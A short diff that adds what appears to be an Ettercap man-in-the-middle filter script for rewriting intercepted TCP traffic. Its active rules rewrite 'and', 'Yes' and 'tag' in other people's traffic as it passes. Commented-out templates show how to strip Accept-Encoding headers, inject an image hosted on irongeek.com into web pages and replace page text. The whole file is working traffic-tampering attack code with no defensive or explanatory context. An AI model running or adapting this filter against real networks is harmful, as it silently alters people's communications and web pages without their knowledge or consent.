@@ -1,0 +1,20 @@
+#if (ip.proto == TCP && tcp.dst == 80) {
+#   if (search(DATA.data, "Accept-Encoding")) {
+#      replace("Accept-Encoding", "Accept-Rubbish!");
+      # note: replacement string is same length as original string
+#      msg("zapped Accept-Encoding!\n");
+#   }
+#}
+if (ip.proto == TCP ) {
+
+ #  replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+  # replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+   
+   #replace("<p>", "<p>Text I want to display</p>");
+   #replace("<P>", "<P>Test I want to display</P>");
+   
+   #pcre_regex(DATA.data, "\<div\>.*\<\/div\>", "\Q<div>Text I want to display</div>\E");
+   pcre_regex(DATA.data, "and","ane");
+   pcre_regex(ENCODED.data, "Yes","NO!");
+   replace("tag","tog");
+}
